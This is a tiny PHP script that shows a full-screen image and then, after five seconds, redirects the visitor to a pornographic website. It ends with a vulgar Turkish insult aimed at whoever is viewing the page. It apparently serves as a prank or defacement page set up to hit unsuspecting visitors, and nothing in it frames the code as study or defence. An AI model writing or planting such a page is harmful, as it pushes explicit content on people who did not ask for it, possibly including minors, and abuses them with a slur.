<?php

echo "<img src='albideburdanbak.jpg' style='width:100%;height:100%'/>";
header("Refresh: 5; url=https://pornhub.com");
die("Yönlendirilmiş Olmalıydın Orospu Cocu");

?>